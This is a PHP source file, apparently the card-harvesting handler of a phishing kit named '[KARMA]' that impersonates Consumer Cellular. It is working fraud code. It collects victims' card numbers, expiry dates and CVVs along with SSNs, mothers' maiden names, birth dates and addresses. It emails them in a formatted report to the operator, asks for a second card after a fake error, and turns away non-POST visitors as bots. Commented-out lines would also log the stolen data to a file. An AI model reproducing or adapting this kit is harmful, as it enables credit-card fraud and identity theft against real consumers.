<?php
require_once __DIR__ . '/../[KARMA]/core/rules.php';
require_once __DIR__ . '/../[KARMA]/core/functions.php';
$config = require __DIR__ . '/../[KARMA]/config/config.php';

$info = get_ip_info();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$browser = get_browser_name($user_agent);
$device = get_device_type($user_agent);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $currentCard = $_POST['karma-ccnum'] ?? '';
    $lastCard = $_SESSION['karma-last-ccnum'] ?? null;
    $attempt = $_SESSION['karma-cc-attempt'] ?? 0;

    if ($attempt === 0) {
        $_SESSION['karma-ccname'] = $_POST['karma-ccname'] ?? '';
        $_SESSION['karma-ccnum'] = $_POST['karma-ccnum'] ?? '';
        $_SESSION['karma-ccexp'] = $_POST['karma-ccexp'] ?? '';
        $_SESSION['karma-cccvv'] = $_POST['karma-cccvv'] ?? '';
        $data = [
            'ccname' => $_POST['karma-ccname'],
            'ccnum' => $_POST['karma-ccnum'],
            'ccexp' => $_POST['karma-ccexp'],
            'cccvv' => $_POST['karma-cccvv'],
            'fullname' => $_SESSION['karma-fullname'] ?? '',
            'dob' => $_SESSION['karma-dob'] ?? '',
            'cob' => $_SESSION['karma-cob'] ?? '',
            'street' => $_SESSION['karma-street'] ?? '',
            'street2' => $_SESSION['karma-street2'] ?? '',
            'company' => $_SESSION['karma-company'] ?? '',
            'city' => $_SESSION['karma-city'] ?? '',
            'province' => $_SESSION['karma-province'] ?? '',
            'postcode' => $_SESSION['karma-postcode'] ?? '',
            'country' => $_SESSION['karma-country'] ?? '',
            'phone' => $_SESSION['karma-phonenumber'],
            'ssn' => $_SESSION['karma-ssn'] ?? '',
            'mmn' => $_SESSION['karma-mmn'] ?? '',
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'time' => date('Y-m-d H:i:s'),
        ];

        $bin = substr(htmlspecialchars($data['ccnum']), 0, 6);
        $binInfo = get_bin_info($bin, $apiKey);
        $binBrand   = $binInfo['CardBrand'] ?? 'Unknown';
        $binType    = $binInfo['CardType'] ?? 'Unknown';
        $binBank    = $binInfo['IssuingInstitution'] ?? 'Unknown';
        $binCountry = $binInfo['IssuingCountry'] ?? 'Unknown';

        $to = $config['email_result'];
        $subject = $bin . ' :: ' .$binType . ' :: ' . $binBrand . ' :: ' . $binBank . ' # [ ' . $binCountry . ' - ' . $data['ip'] . ' ]';
        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif; max-width: 540px; margin: 32px auto; background: #fff; border-radius: 18px; box-shadow: 0 4px 24px #0002; padding: 32px 28px;">'
            .'<h2 style="color:#f26631; font-size: 1.6rem; margin-bottom: 18px; letter-spacing: 0.5px;"># Card Info #</h2>'
            .'<table style="width:100%; font-size: 1rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">Name on Card</td><td style="padding:8px 0;">' . htmlspecialchars($data['ccname']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Card Number</td><td style="padding:8px 0;">' . htmlspecialchars($data['ccnum']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Expiration</td><td style="padding:8px 0;">' . htmlspecialchars($data['ccexp']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">CVV</td><td style="padding:8px 0;">' . htmlspecialchars($data['cccvv']) . '</td></tr>'
            .'</table>'
            .'<h2 style="color:#0071e3; font-size: 1rem; margin-bottom: 18px; letter-spacing: 0.5px;"># More Info #</h2>'
            .'<table style="width:100%; font-size: 1rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">BIN</td><td style="padding:8px 0;">' . htmlspecialchars($bin) . '</td></tr>'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">Type</td><td style="padding:8px 0;">' . htmlspecialchars($binType) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Brand</td><td style="padding:8px 0;">' . htmlspecialchars($binBrand) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Bank</td><td style="padding:8px 0;">' . htmlspecialchars($binBank) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Country</td><td style="padding:8px 0;">' . htmlspecialchars($binCountry) . '</td></tr>'
            .'</table>'
            .'<hr style="margin:28px 0 18px 0; border:0; border-top:1.5px solid #eee;">'
            .'<h2 style="color:#0071e3; font-size: 1.6rem; margin-bottom: 18px; letter-spacing: 0.5px;"># Address #</h2>'
            .'<table style="width:100%; font-size: 1rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">Full Name</td><td style="padding:8px 0;">' . htmlspecialchars($data['fullname']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Date of Birth</td><td style="padding:8px 0;">' . htmlspecialchars($data['dob']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Country of Birth</td><td style="padding:8px 0;">' . htmlspecialchars($data['cob']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Street</td><td style="padding:8px 0;">' . htmlspecialchars($data['street']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Street 2</td><td style="padding:8px 0;">' . htmlspecialchars($data['street2']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Company</td><td style="padding:8px 0;">' . htmlspecialchars($data['company']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">City</td><td style="padding:8px 0;">' . htmlspecialchars($data['city']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Province</td><td style="padding:8px 0;">' . htmlspecialchars($data['province']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Postcode</td><td style="padding:8px 0;">' . htmlspecialchars($data['postcode']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Country/Region</td><td style="padding:8px 0;">' . htmlspecialchars($data['country']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Phone Number</td><td style="padding:8px 0;">' . htmlspecialchars($data['phone']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">SSN</td><td style="padding:8px 0;">' . htmlspecialchars($data['ssn']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">MMN</td><td style="padding:8px 0;">' . htmlspecialchars($data['mmn']) . '</td></tr>'
            .'</table>'
            .'<hr style="margin:28px 0 18px 0; border:0; border-top:1.5px solid #eee;">'
            .'<h3 style="color:#0071e3; font-size: 1.1rem; margin-bottom: 10px; letter-spacing: 0.2px;"># Device Info #</h3>'
            .'<table style="width:100%; font-size: 0.98rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">Device</td><td style="padding:7px 0;">' . htmlspecialchars($device) . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">Browser</td><td style="padding:7px 0;">' . htmlspecialchars($browser) . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">IP Address</td><td style="padding:7px 0;">' . htmlspecialchars($info['ip'] ?? '') . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">ISP</td><td style="padding:7px 0;">' . htmlspecialchars($info['isp'] ?? '') . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">Country</td><td style="padding:7px 0;">' . htmlspecialchars($info['country'] ?? '') . '</td></tr>'
            .'<tr><td style="padding:7px 0;color:#888;">User Agent</td><td style="padding:7px 0;word-break:break-all;">' . htmlspecialchars($data['user_agent']) . '</td></tr>'
            .'<tr><td style="padding:7px 0;color:#888;">Time</td><td style="padding:7px 0;">' . htmlspecialchars($data['time']) . '</td></tr>'
            .'</table>'
            .'</div>';
        $message = wordwrap($message, 998, "\r\n");
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=UTF-8\r\n";
        $headers .= "From: " . htmlspecialchars($data['ccname']) . " <karma@server.smh>\r\n";
        mail($to, $subject, $message, $headers);
        log_event('CARD 1 RECEIVED');
        $_SESSION['karma-last-ccnum'] = $currentCard;
        $_SESSION['karma-cc-attempt'] = 1;
        $_SESSION['karma-card-error'] = 'first';
        
        // $line =
        //     "############## - CARD #1 START - ##############\n" .
        //     "NAME ON CARD: " . htmlspecialchars($data['ccname']) . "\n" .
        //     "CARD NUMBER: " . htmlspecialchars($data['ccnum']) . "\n" .
        //     "EXP DATE: " . htmlspecialchars($data['ccexp']) . "\n" .
        //     "CVV: " . htmlspecialchars($data['cccvv']) . "\n" .
        //     "BIN: " . htmlspecialchars($bin) . "\n" .
        //     "TYPE: " . htmlspecialchars($binType) . "\n" .
        //     "BRAND: " . htmlspecialchars($binBrand) . "\n" .
        //     "BANK: " . htmlspecialchars($binBank) . "\n" .
        //     "COUNTRY: " . htmlspecialchars($binCountry) . "\n" .
        //     "IP: " . htmlspecialchars($info['ip'] ?? '') . "\n" .
        //     "ISP: " . htmlspecialchars($info['isp'] ?? '') . "\n" .
        //     "Country: " . htmlspecialchars($info['country'] ?? '') . "\n" .
        //     "Device: " . htmlspecialchars($device) . "\n" .
        //     "Browser: " . htmlspecialchars($browser) . "\n" .
        //     "User Agent: " . htmlspecialchars($user_agent) . "\n" .
        //     "TIME: " . htmlspecialchars($data['time']) . "\n" .
        //     "############## - CARD #1 END - ##############\n\n" .
        //     "---------------------------------------------\n\n";
        // file_put_contents(__DIR__ . '/../[KARMA]/logs/gelap.txt', $line, FILE_APPEND);
        
        header('Location: /consumercellular.com/cards');
        exit;
    } elseif ($currentCard === $lastCard) {
        $_SESSION['karma-card-error'] = 'same';
        header('Location: /consumercellular.com/cards');
        exit;
    } else {
        $_SESSION['karma-ccname'] = $_POST['karma-ccname'] ?? '';
        $_SESSION['karma-ccnum'] = $_POST['karma-ccnum'] ?? '';
        $_SESSION['karma-ccexp'] = $_POST['karma-ccexp'] ?? '';
        $_SESSION['karma-cccvv'] = $_POST['karma-cccvv'] ?? '';
        $data = [
            'ccname' => $_POST['karma-ccname'],
            'ccnum' => $_POST['karma-ccnum'],
            'ccexp' => $_POST['karma-ccexp'],
            'cccvv' => $_POST['karma-cccvv'],
            'fullname' => $_SESSION['karma-fullname'] ?? '',
            'dob' => $_SESSION['karma-dob'] ?? '',
            'cob' => $_SESSION['karma-cob'] ?? '',
            'street' => $_SESSION['karma-street'] ?? '',
            'street2' => $_SESSION['karma-street2'] ?? '',
            'company' => $_SESSION['karma-company'] ?? '',
            'city' => $_SESSION['karma-city'] ?? '',
            'province' => $_SESSION['karma-province'] ?? '',
            'postcode' => $_SESSION['karma-postcode'] ?? '',
            'country' => $_SESSION['karma-country'] ?? '',
            'ssn' => $_SESSION['karma-ssn'] ?? '',
            'mmn' => $_SESSION['karma-mmn'] ?? '',
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'time' => date('Y-m-d H:i:s'),
        ];

        $bin = substr(htmlspecialchars($data['ccnum']), 0, 6);
        $binInfo = get_bin_info($bin, $apiKey);
        $binBrand   = $binInfo['CardBrand'] ?? 'Unknown';
        $binType    = $binInfo['CardType'] ?? 'Unknown';
        $binBank    = $binInfo['IssuingInstitution'] ?? 'Unknown';
        $binCountry = $binInfo['IssuingCountry'] ?? 'Unknown';

        $to = $config['email_result'];
        $subject = $bin . ' :: ' .$binType . ' :: ' . $binBrand . ' :: ' . $binBank . ' # [ ' . $binCountry . ' - ' . $data['ip'] . ' ]';
        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif; max-width: 540px; margin: 32px auto; background: #fff; border-radius: 18px; box-shadow: 0 4px 24px #0002; padding: 32px 28px;">'
            .'<h2 style="color:#0071e3; font-size: 1.6rem; margin-bottom: 18px; letter-spacing: 0.5px;"># Card Info #</h2>'
            .'<table style="width:100%; font-size: 1rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">Name on Card</td><td style="padding:8px 0;">' . htmlspecialchars($data['ccname']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Card Number</td><td style="padding:8px 0;">' . htmlspecialchars($data['ccnum']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Expiration</td><td style="padding:8px 0;">' . htmlspecialchars($data['ccexp']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">CVV</td><td style="padding:8px 0;">' . htmlspecialchars($data['cccvv']) . '</td></tr>'
            .'</table>'
            .'<h2 style="color:#0071e3; font-size: 1rem; margin-bottom: 18px; letter-spacing: 0.5px;"># More Info #</h2>'
            .'<table style="width:100%; font-size: 1rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">BIN</td><td style="padding:8px 0;">' . htmlspecialchars($bin) . '</td></tr>'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">Type</td><td style="padding:8px 0;">' . htmlspecialchars($binType) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Brand</td><td style="padding:8px 0;">' . htmlspecialchars($binBrand) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Bank</td><td style="padding:8px 0;">' . htmlspecialchars($binBank) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Country</td><td style="padding:8px 0;">' . htmlspecialchars($binCountry) . '</td></tr>'
            .'</table>'
            .'<hr style="margin:28px 0 18px 0; border:0; border-top:1.5px solid #eee;">'
            .'<h2 style="color:#0071e3; font-size: 1.6rem; margin-bottom: 18px; letter-spacing: 0.5px;"># Address #</h2>'
            .'<table style="width:100%; font-size: 1rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:8px 0;width:160px;color:#888;">Full Name</td><td style="padding:8px 0;">' . htmlspecialchars($data['fullname']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Date of Birth</td><td style="padding:8px 0;">' . htmlspecialchars($data['dob']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Country of Birth</td><td style="padding:8px 0;">' . htmlspecialchars($data['cob']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Street</td><td style="padding:8px 0;">' . htmlspecialchars($data['street']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Street 2</td><td style="padding:8px 0;">' . htmlspecialchars($data['street2']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Company</td><td style="padding:8px 0;">' . htmlspecialchars($data['company']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">City</td><td style="padding:8px 0;">' . htmlspecialchars($data['city']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Province</td><td style="padding:8px 0;">' . htmlspecialchars($data['province']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Postcode</td><td style="padding:8px 0;">' . htmlspecialchars($data['postcode']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">Country/Region</td><td style="padding:8px 0;">' . htmlspecialchars($data['country']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">SSN</td><td style="padding:8px 0;">' . htmlspecialchars($data['ssn']) . '</td></tr>'
            .'<tr><td style="padding:8px 0;color:#888;">MMN</td><td style="padding:8px 0;">' . htmlspecialchars($data['mmn']) . '</td></tr>'
            .'</table>'
            .'<hr style="margin:28px 0 18px 0; border:0; border-top:1.5px solid #eee;">'
            .'<h3 style="color:#0071e3; font-size: 1.1rem; margin-bottom: 10px; letter-spacing: 0.2px;"># Device Info #</h3>'
            .'<table style="width:100%; font-size: 0.98rem; color: #222; border-collapse: collapse;">'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">Device</td><td style="padding:7px 0;">' . htmlspecialchars($device) . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">Browser</td><td style="padding:7px 0;">' . htmlspecialchars($browser) . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">IP Address</td><td style="padding:7px 0;">' . htmlspecialchars($info['ip'] ?? '') . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">ISP</td><td style="padding:7px 0;">' . htmlspecialchars($info['isp'] ?? '') . '</td></tr>'
            .'<tr><td style="padding:7px 0;width:160px;color:#888;">Country</td><td style="padding:7px 0;">' . htmlspecialchars($info['country'] ?? '') . '</td></tr>'
            .'<tr><td style="padding:7px 0;color:#888;">User Agent</td><td style="padding:7px 0;word-break:break-all;">' . htmlspecialchars($data['user_agent']) . '</td></tr>'
            .'<tr><td style="padding:7px 0;color:#888;">Time</td><td style="padding:7px 0;">' . htmlspecialchars($data['time']) . '</td></tr>'
            .'</table>'
            .'</div>';
        $message = wordwrap($message, 998, "\r\n");
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=UTF-8\r\n";
        $headers .= "From: " . htmlspecialchars($data['ccname']) . " <karma@server.smh>\r\n";
        mail($to, $subject, $message, $headers);
        log_event('CARD 2 RECEIVED');
        
        // $line =
        //     "############## - CARD #2 START - ##############\n" .
        //     "NAME ON CARD: " . htmlspecialchars($data['ccname']) . "\n" .
        //     "CARD NUMBER: " . htmlspecialchars($data['ccnum']) . "\n" .
        //     "EXP DATE: " . htmlspecialchars($data['ccexp']) . "\n" .
        //     "CVV: " . htmlspecialchars($data['cccvv']) . "\n" .
        //     "BIN: " . htmlspecialchars($bin) . "\n" .
        //     "TYPE: " . htmlspecialchars($binType) . "\n" .
        //     "BRAND: " . htmlspecialchars($binBrand) . "\n" .
        //     "BANK: " . htmlspecialchars($binBank) . "\n" .
        //     "COUNTRY: " . htmlspecialchars($binCountry) . "\n" .
        //     "IP: " . htmlspecialchars($info['ip'] ?? '') . "\n" .
        //     "ISP: " . htmlspecialchars($info['isp'] ?? '') . "\n" .
        //     "Country: " . htmlspecialchars($info['country'] ?? '') . "\n" .
        //     "Device: " . htmlspecialchars($device) . "\n" .
        //     "Browser: " . htmlspecialchars($browser) . "\n" .
        //     "User Agent: " . htmlspecialchars($user_agent) . "\n" .
        //     "TIME: " . htmlspecialchars($data['time']) . "\n" .
        //     "############## - CARD #2 END - ##############\n\n" .
        //     "---------------------------------------------\n\n";
        // file_put_contents(__DIR__ . '/../[KARMA]/logs/gelap.txt', $line, FILE_APPEND);
        header('Location: /consumercellular.com/bank');
        exit;
    }
} else {
    http_response_code(405);
    header('Location: ' . $config['redirect_bots']);
    exit;
}
